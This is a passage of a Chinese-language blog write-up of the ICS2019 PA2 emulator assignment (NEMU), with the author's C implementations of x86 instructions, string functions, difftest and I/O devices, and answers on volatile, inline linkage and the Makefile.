aria-hidden="true">image-20230418034312229</figcaption></figure><p>recursion，call_rm没实现。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211023566968_525_20230523225633722246_665_image-20230418034508931.png" alt="image-20230418034508931"><figcaption aria-hidden="true">image-20230418034508931</figcaption></figure><p>手册上call写的很长，只需要关注r/m部分就可以了</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211024660721_703_20230523225635958260_687_image-20230418034759314.png" alt="image-20230418034759314"><figcaption aria-hidden="true">image-20230418034759314</figcaption></figure><p>对应实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8ypbw7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-8ypbw7lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(call_rm) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_li</span>(&amp;s0,id_dest-&gt;val);  <span class="hljs-built_in">rtl_mv</span>(&amp;decinfo.jmp_pc,&amp;s0);  <span class="hljs-comment">//decinfo.is_jmp=1;</span>  <span class="hljs-built_in">rtl_push</span>(pc);  <span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"call *%s"</span>, id_dest-&gt;str);}</code></pre></div></div><p>这时候发现只有<code>string</code>过不了了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211026175881_831_20230523225639988445_167_image-20230418180917748.png" alt="image-20230418180917748"><figcaption aria-hidden="true">image-20230418180917748</figcaption></figure><p>一开始看到运行到了bad指令以为是自己跳转指令实现的有问题，回去检查了一遍没发现毛病，看指导书才发现是自己少做了东西。然后2020版的文档这个位置就挨着不要以为有TDDO才需要实现的免责声明。多少有点挑衅了。但又不能说什么，谁让我没好好看文档。。。</p><p>按照指导书提示，要完成<code>string.c</code>中列出的字符串处理函数才能通过这个样例。看源代码实现下面三个函数就可以了。我们只需要通过直接操作字符来完成库函数本应有的功能即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yurocylmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-yurocylmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">strncpy</span><span class="hljs-params">(<span class="hljs-type">char</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* src, <span class="hljs-type">size_t</span> n)</span> </span>{<span class="hljs-type">char</span>* pd=dst;<span class="hljs-keyword">while</span> (n&gt;<span class="hljs-number">0</span>&amp;&amp;*src!=<span class="hljs-string">'\0'</span>) --n,*pd=*src,++pd,++src;<span class="hljs-keyword">while</span> (n&gt;<span class="hljs-number">0</span>) --n,*pd=<span class="hljs-string">'\0'</span>,++pd;<span class="hljs-keyword">return</span> dst;}<span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">strcat</span><span class="hljs-params">(<span class="hljs-type">char</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* src)</span> </span>{<span class="hljs-type">char</span>* pd=dst;<span class="hljs-keyword">while</span> (*pd!=<span class="hljs-string">'\0'</span>) ++pd;<span class="hljs-keyword">while</span> (*src!=<span class="hljs-string">'\0'</span>) *pd=*src,++pd,++src;*pd=<span class="hljs-string">'\0'</span>;<span class="hljs-keyword">return</span> dst;}<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* s2)</span> </span>{<span class="hljs-keyword">while</span> (*s1!=<span class="hljs-string">'\0'</span>&amp;&amp;*s2!=<span class="hljs-string">'\0'</span>&amp;&amp;*s1==*s2) ++s1,++s2;<span class="hljs-keyword">if</span> (*s1&gt;*s2) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*s1&lt;*s2) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>另外<code>sprintf</code>也是一样的单例。网上有很多参考，如<a href="http://blog.chinaunix.net/uid-29073321-id-5557641.html">这个</a>。就不展开了。</p><p>然后发现neg没实现。实现了就好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211027295891_667_20230523225645128900_949_image-20230418182437373.png" alt="image-20230418182437373"><figcaption aria-hidden="true">image-20230418182437373</figcaption></figure><p>顺利AP。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211028239443_674_20230523225647440928_407_image-20230418182631614.png" alt="image-20230418182631614" style="zoom: 50%;"></p><h4 id="问题-1">问题</h4><h6 id="为什么要有am">为什么要有AM？</h6><p>AM的主要目的是程序和架构解耦，也就是屏蔽底层指令集架构的差异，让程序不必关心底层的架构。而操作系存在的目的主要是控制多道程序运行调度，，并提供文件访问，网络，输入输出等方便调用的接口。从功能上AM和OS有所重叠，但在抽象层次上AM是处于操作系统下层的。</p><h6 id="堆和栈在哪里">堆和栈在哪里？</h6><p>这个问题2019没有，看了学校手册才知道。</p><p>堆和栈在内存里。</p><p>为什么堆和栈的内容没有放入可执行文件里面?那程序运行时刻用到的堆和栈又是怎么来的？</p><p>因为堆和栈的大小是在运行时确定的，它们的内容无法在编译时被包含在可执行文件中。相反，它们的大小和位置由操作系统根据程序的需要在运行时进行动态分配和管理。</p><h6 id="指令名对照">指令名对照</h6><p>对于x86手册附录有opcode-map，直接根据指令的opcode查询即可，不必非得通过名称查询。这建立在指令名本身只是方便记忆的助记符，二手册对opcode的指令功能和解码方式进行的约定。</p><h3 id="difftest">difftest</h3><h4 id="任务-2">任务</h4><p><code>difftest</code>的实现我们只需要实现检查寄存器的环节即可。</p><p><code>nemu/src/isa/mips32/diff-test.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bo7jr4lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-bo7jr4lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isa_difftest_checkregs</span><span class="hljs-params">(CPU_state *ref_r, <span class="hljs-type">vaddr_t</span> pc)</span> </span>{  <span class="hljs-keyword">if</span> ((*ref_r).eax!=cpu.eax||(*ref_r).ecx!=cpu.ecx||(*ref_r).edx!=cpu.edx||(*ref_r).ebx!=cpu.ebx||(*ref_r).esp!=cpu.esp||(*ref_r).ebp!=cpu.ebp||(*ref_r).esi!=cpu.esi||(*ref_r).edi!=cpu.edi||(*ref_r).pc!=cpu.pc) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}<span class="hljs-function">xxxxxxxxxx&nbsp;<span class="hljs-type">bool</span> <span class="hljs-title">isa_difftest_checkregs</span><span class="hljs-params">(CPU_state *ref_r, <span class="hljs-type">vaddr_t</span> pc)</span> </span>{ &nbsp;<span class="hljs-keyword">if</span> ((*ref_r).eax!=cpu.eax||(*ref_r).ecx!=cpu.ecx    ||(*ref_r).edx!=cpu.edx||(*ref_r).ebx!=cpu.ebx    ||(*ref_r).esp!=cpu.esp||(*ref_r).ebp!=cpu.ebp    ||(*ref_r).esi!=cpu.esi||(*ref_r).edi!=cpu.edi    ||(*ref_r).pc!=cpu.pc) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &nbsp;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}nemu/src/isa/mips32/diff-test.c</code></pre></div></div><h4 id="问题-2">问题</h4><h6 id="api约定">API约定</h6><p>实验指导书中提到，在介绍API约定的时候,提到了寄存器状态<code>r</code>需要把寄存器按照某种顺序排列.<code>qemu-diff</code>作为REF, 已经满足API的这一约束. 让我们RTFSC,从中找出这一顺序, 并检查你的NEMU实现是否已经满足约束.</p><p>我们从宏定义入手，看开启<code>difftest</code>时<code>nemu</code>执行了哪些步骤，指导书其实也有阐述。</p><p>调用<code>init_difftest()</code>，初始化，其中包括从动态库中读取API的符号</p><p><code>nemu/src/monitor/diff-test/diff-test.c</code>-<code>void init_difftest</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211029323323_152_20230523225651167723_797_image-20230417234512940.png" alt="image-20230417234512940"><figcaption aria-hidden="true">image-20230417234512940</figcaption></figure><p>给<code>ref_difftest_setregs</code>传入的参数是cpu。在PA1中我们完成了这个结构体，寄存器顺序如下:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211030355455_952_20230523225653391160_373_image-20230417235814052.png" alt="image-20230417235814052"><figcaption aria-hidden="true">image-20230417235814052</figcaption></figure><p>再看调用的API:</p><p><code>nemu/tools/qemu-diff/src/diff-test.c</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211031585613_677_20230523225657431948_677_image-20230417234630438.png" alt="image-20230417234630438"><figcaption aria-hidden="true">image-20230417234630438</figcaption></figure><p><code>nemu/tools/qemu-diff/src/isa/x86/include/isa.h</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211032473395_332_20230523225701591453_145_image-20230417232210081.png" alt="image-20230417232210081"><figcaption aria-hidden="true">image-20230417232210081</figcaption></figure><p>可以看到顺序是符合约定的。其中<code>array</code>是存<code>gdb</code>通信的字符串消息的。</p><h6 id="匪夷所思的qemu行为">匪夷所思的QEMU行为</h6><p>这个确实不了解，不过根据指导书，x86也没有这种行为。</p><h6 id="捕捉死循环">捕捉死循环</h6><p>如果我们是像Difftest一样在实现的过程检验实现是否正确(在这次实验中死循环和badinstruction引起的问题确实不好定位，difftest也无能为力，定位到的指令离实际出现的指令十万八千里。只能根据git记录依次检查自己实现的指令可能存在的问题。)，可以采用在naive上记录动态指令执行的指令数，然后执行的时候如果超过了这个指令数就终止。而作为模拟器去检查死循环，可以采用静态代码分析的方式进行。执行起来的时候检查比较难，因为比如设置阈值，其实不知道是程序死循环了还是真的想执行这么多次。</p><h2 id="三阶段">三阶段</h2><h3 id="任务-3">任务</h3><p>别忘了把HAS_IOE打开。</p><h3 id="串口">串口</h3><p>选x86有福了。还要实现<code>in</code>,<code>out</code>指令。还好这个也不难，在它们的执行辅助函数中分别调用<code>pio_read_[l|w|b]()</code>和<code>pio_write_[l|w|b]()</code>函数即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ribq9nlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ribq9nlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(in) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">4</span>) s0=<span class="hljs-built_in">pio_read_l</span>(id_src-&gt;val);  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">2</span>) s0=<span class="hljs-built_in">pio_read_w</span>(id_src-&gt;val);  <span class="hljs-keyword">else</span> s0=<span class="hljs-built_in">pio_read_b</span>(id_src-&gt;val);  <span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);  <span class="hljs-built_in">print_asm_template2</span>(in);}<span class="hljs-built_in">make_EHelper</span>(out) {<span class="hljs-comment">//  TODO();</span><span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">4</span>)  <span class="hljs-built_in">pio_write_l</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">2</span>)  <span class="hljs-built_in">pio_write_w</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;width==<span class="hljs-number">1</span>) <span class="hljs-built_in">pio_write_b</span>(id_dest-&gt;val,id_src-&gt;val);<span class="hljs-keyword">else</span> <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);<span class="hljs-built_in">print_asm_template2</span>(out);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211033387892_259_20230523225703718139_454_image-20230418190251286.png" alt="image-20230418190251286"><figcaption aria-hidden="true">image-20230418190251286</figcaption></figure><p>看手册，果然是IN，OUT指令。在opcode_table里面补上即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211034316175_681_20230523225706985852_641_image-20230418190440852.png" alt="image-20230418190440852"><figcaption aria-hidden="true">image-20230418190440852</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211035280904_873_20230523225709250708_350_image-20230418192239874.png" alt="image-20230418192239874" width="67%" height="67%"></p><h3 id="时钟">时钟</h3><p>这个部分看了半天没看明白要干什么，查阅网上资料才知道怎么做:</p><p>初始化时通过inl(RTC_ADDR)获取初始时间boot_time，随后uptime时同样读取时间，相减作为uptime-&gt;lo。</p><p>在<code>_DEVREG_TIMER_UPTIME</code>case里面:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8docwilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-8docwilmrh9u68"><pre><code class="hljs C++">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tt=(<span class="hljs-built_in">inl</span>(RTC_ADDR)-init_tim);<span class="hljs-comment">//      printf("%d\n",tt);</span>      uptime-&gt;hi = <span class="hljs-number">0</span>;      uptime-&gt;lo = tt;</code></pre></div></div><p>后面没实现的初始化函数:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lj4lavlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-lj4lavlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">void</span> __am_timer_init() {init_tim=<span class="hljs-built_in">inl</span>(RTC_ADDR);}</code></pre></div></div><p>当然要增加一个静态全局变量<code>init_tim</code>把初始时间记下来。</p><p>至于怎么跑，<code>make ARCH=native mainargs=H run</code>可以看到:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211036423311_503_20230523225713545364_139_image-20230418194525024.png" alt="image-20230418194525024"><figcaption aria-hidden="true">image-20230418194525024</figcaption></figure><p>因此可以<code>make ARCH=x86-nemu mainargs=t run</code>，当然<code>naive</code>也是可以对照着看的。</p><p>一开始发现进入之后不打印，一直死循环，发现是没有实现<code>printf</code>。补上就可以了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211037278159_262_20230523225716611404_456_image-20230418194930929.png" alt="image-20230418194930929"><figcaption aria-hidden="true">image-20230418194930929</figcaption></figure><p>跑分，随便跑了一个，现在性能还是比较拉胯。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211039337832_998_20230523225720787415_925_image-20230418201037377.png" alt="image-20230418201037377"><figcaption aria-hidden="true">image-20230418201037377</figcaption></figure><h4 id="键盘">键盘</h4><p>和时钟相似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rm058slmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-rm058slmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _DEVREG_INPUT_KBD:{  _DEV_INPUT_KBD_t *kbd = (_DEV_INPUT_KBD_t *)buf;  <span class="hljs-type">uint32_t</span> code_key = <span class="hljs-built_in">inl</span>(KBD_ADDR);  <span class="hljs-keyword">if</span> (code_key == _KEY_NONE)  {    kbd-&gt;keydown = <span class="hljs-number">0</span>;    kbd-&gt;keycode = _KEY_NONE;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> (code_key &amp; <span class="hljs-number">0x8000</span>)      kbd-&gt;keydown = <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span>      kbd-&gt;keydown = <span class="hljs-number">0</span>;    kbd-&gt;keycode = (code_key);  }  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sizeof</span>(_DEV_INPUT_KBD_t);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211040355929_180_20230523225723117288_548_image-20230418202105754.png" alt="image-20230418202105754"><figcaption aria-hidden="true">image-20230418202105754</figcaption></figure><h3 id="vga">VGA</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3jk2phlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-3jk2phlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">vga_io_handler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">int</span> len, <span class="hljs-type">bool</span> is_write)</span> </span>{  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> call `update_screen()` when writing to the sync register</span>  <span class="hljs-comment">//TODO();</span>  <span class="hljs-keyword">if</span> (is_write)  {    <span class="hljs-built_in">update_screen</span>();  }}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bibmqklmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-bibmqklmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">size_t</span> __am_video_write(<span class="hljs-type">uintptr_t</span> reg, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size){  <span class="hljs-keyword">switch</span> (reg)  {  <span class="hljs-keyword">case</span> _DEVREG_VIDEO_FBCTL:  {    _DEV_VIDEO_FBCTL_t *ctl = (_DEV_VIDEO_FBCTL_t *)buf;    <span class="hljs-type">uint32_t</span> p = <span class="hljs-number">0</span>;    <span class="hljs-type">uint32_t</span> *ff;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = ctl-&gt;y; j &lt; ctl-&gt;y + ctl-&gt;h; ++j)      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = ctl-&gt;x; i &lt; ctl-&gt;x + ctl-&gt;w; ++i)      {        ff = (<span class="hljs-type">uint32_t</span> *)(<span class="hljs-type">uintptr_t</span>)(FB_ADDR) + (j * <span class="hljs-number">400</span>);        ff[i] = ctl-&gt;pixels[p];        ++p;      }    <span class="hljs-keyword">if</span> (ctl-&gt;sync)    {      <span class="hljs-built_in">outl</span>(SYNC_ADDR, <span class="hljs-number">0</span>);    }    <span class="hljs-keyword">return</span> size;  }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-type">void</span> __am_vga_init(){  <span class="hljs-type">int</span> i;  <span class="hljs-type">int</span> size = <span class="hljs-built_in">screen_width</span>() * <span class="hljs-built_in">screen_height</span>();  <span class="hljs-type">uint32_t</span> *fb = (<span class="hljs-type">uint32_t</span> *)(<span class="hljs-type">uintptr_t</span>)FB_ADDR;  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size; i++)    fb[i] = i;  <span class="hljs-built_in">draw_sync</span>();}![image<span class="hljs-number">-20230418210820936</span>](https:<span class="hljs-comment">//raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211041560535_570_20230523225728354796_263_image-20230418210820936.png)</span></code></pre></div></div><h4 id="问题-3">问题</h4><h6 id="volitle关键字">volitle关键字</h6><p>volitle关键字的基本含义是编译后的程序每次需要存储或读取这个变量的时候，告诉编译器对该变量不做优化，都会直接从变量内存地址中读取数据，从而可以提供对特殊地址的稳定访问。</p><p>参见<a href="https://zhuanlan.zhihu.com/p/343688629">这里</a></p><p>文中的例子便是手册中提及到的情形:</p><p>假设要对一个设备进行初始化，此设备的某一个寄存器为0x8049000</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kqbm3blmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-kqbm3blmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span></span>{<span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *p=(<span class="hljs-type">void</span> *)<span class="hljs-number">0x8049000</span>; *p=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(*p !=<span class="hljs-number">0xff</span>);*p=<span class="hljs-number">0x33</span>;*p=<span class="hljs-number">0x34</span>;*p=<span class="hljs-number">0x86</span>;}</code></pre></div></div><p>正常先循环读后写，一切正常。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211042853070_743_20230523225733159116_222_image-20230418224522431.png" alt="image-20230418224522431"><figcaption aria-hidden="true">image-20230418224522431</figcaption></figure><p>去掉volatile:</p><p>经过编译器优化后，编译器认为指针指向的内容都是0了，下面while肯定是一个死循环，就自己jmp自己了。表现在设备上，就是一直在读，写不进去，就出问题了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211043774455_612_20230523225737654532_187_image-20230418224713003.png" alt="image-20230418224713003"><figcaption aria-hidden="true">image-20230418224713003</figcaption></figure><h6 id="如何检测多个键同时被按下">如何检测多个键同时被按下？</h6><p>键码相或即可。</p><h3 id="必答题">必答题</h3><h6 id="整理一条指令的运行过程">整理一条指令的运行过程</h6><p>这个问题2018版没有，事实上PA2第一部分指令系统的课件说的也非常详细。</p><h6 id="编译与链接">编译与链接</h6><p><a href="https://blog.csdn.net/huanghui167/article/details/41346663">参考</a></p><p>inline关键字实际上表示建议内联，gcc中O0优化时是不内联的。所以在头文件中用inline时务必加入static。为了确保内联，头文件中用 inline 时务必加入 static，否则当 inline不内联时就和普通函数在头文件中定义一样，当多个 c文件包含时就会重定义。加入 static 后代码健壮性高，如果只是用 inline时编译器都内联了，那两者的实际效果是一样的。</p><p>在我的环境下，去掉<code>static</code>和去掉<code>inline</code>是没有影响的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211044662641_241_20230523225741529190_435_image-20230418165948224.png" alt="image-20230418165948224"><figcaption aria-hidden="true">image-20230418165948224</figcaption></figure><p>但是都去掉，就报错了：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211046474774_474_20230523230801541908_353_image-20230418171100319.png" alt="image-20230418171100319"><figcaption aria-hidden="true">image-20230418171100319</figcaption></figure><p>因为头文件会被许多文件引用所以如果去掉staticinline,这个函数就会被多次定义，在链接的时候会报错。</p><p>重新编译NEMU.请问重新编译后的NEMU含有38个<code>dummy</code>变量的实体(统计得到的加上<code>common.h</code>里的)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211047556012_298_20230523230807076612_975_image-20230418172006341.png" alt="image-20230418172006341"><figcaption aria-hidden="true">image-20230418172006341</figcaption></figure><p><code>nemu/include/debug.h</code>加了之后没变化(虽然理论上会多)</p><p>加上等于0，报错。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211048550534_453_20230523230813184695_469_image-20230418180715096.png" alt="image-20230418180715096"><figcaption aria-hidden="true">image-20230418180715096</figcaption></figure><p>课上讲过，在C语言中只声明不初始化是一种弱定义，当声明多个同名同类型的变量时，编译不会报错，但是到了链接阶段，由于全是弱符号，链接器会随便选择一个。但是，有了初始化之后之后就不一样了，这变成了强定义，编译器无法忽略。</p><h6 id="makefile执行过程">makefile执行过程</h6><p>之前操作系统折磨过的一次makefile又回来折磨人了。 即便当时写了<a href="https://lunaticsky-tql.github.io/posts/23557/">makefile急速入门</a>，makefile这个东西不得不说和shell脚本一样，语法独具其风格，简练强大但可读性也不敢恭维。</p><p>我们输入make默认生成NEMU的二进制文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-46s9dqlmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-46s9dqlmrh9u68"><pre><code class="hljs makefile"><span class="hljs-section">app: <span class="hljs-variable">$(BINARY)</span></span></code></pre></div></div><p>再去看<code>$(BINARY)</code>的依赖:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sf48rvlmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-sf48rvlmrh9u68"><pre><code class="hljs makefile"><span class="hljs-variable">$(BINARY)</span>: <span class="hljs-variable">$(OBJS)</span><span class="hljs-variable">$(<span class="hljs-built_in">call</span> git_commit, "compile")</span>@echo + LD <span class="hljs-variable">$@</span>@<span class="hljs-variable">$(LD)</span> -O2 -rdynamic <span class="hljs-variable">$(SO_LDLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> -lSDL2 -lreadline -ldl</code></pre></div></div><p>BINARY 依赖于 OBJS</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2mi7w9lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-2mi7w9lmrh9u68"><pre><code class="hljs C++">OBJS = $(SRCS:src/%.c=$(OBJ_DIR)/%.o)</code></pre></div></div><p>(var:a=b)，是将 var 变量中每一个单词后面的 a 替换为b。所以OBJS其实就是build 文件夹下的所有.o 文件</p><p>OBJ_DIR是前面定义了的构建路径目标</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gi681zlmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-gi681zlmrh9u68"><pre><code class="hljs makefile">OBJ_DIR ?= <span class="hljs-variable">$(BUILD_DIR)</span>/obj-<span class="hljs-variable">$(ISA)</span><span class="hljs-variable">$(SO)</span>BINARY ?= <span class="hljs-variable">$(BUILD_DIR)</span>/<span class="hljs-variable">$(ISA)</span>-<span class="hljs-variable">$(NAME)</span><span class="hljs-variable">$(SO)</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211049486409_502_20230523230818475318_173_image-20230418215016739.png" alt="image-20230418215016739"><figcaption aria-hidden="true">image-20230418215016739</figcaption></figure><p>关于SRC:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q8kuovlmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-q8kuovlmrh9u68"><pre><code class="hljs makefile">SRCS = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find src/ -name "*.c" | grep -v "isa")</span>SRCS += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find src/isa/<span class="hljs-variable">$(ISA)</span> -name "*.c")</span></code></pre></div></div><p>-v表示不匹配“isa"，先把isa文件夹排除掉，再根据选择的指令集去isa文件夹里面找。SRC包括构建NEMU用到的所有.c文件。</p><p>build 的各.o 文件依赖于 src 文件夹下的所有.c 文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dz0p0glmrh9u68"></i><span>makefile</span><div class="collapse show" id="collapse-dz0p0glmrh9u68"><pre><code class="hljs makefile"><span class="hljs-variable">$(OBJ_DIR)</span>/%.o: src/%.c@echo + CC <span class="hljs-variable">$&lt;</span>@mkdir -p <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> <span 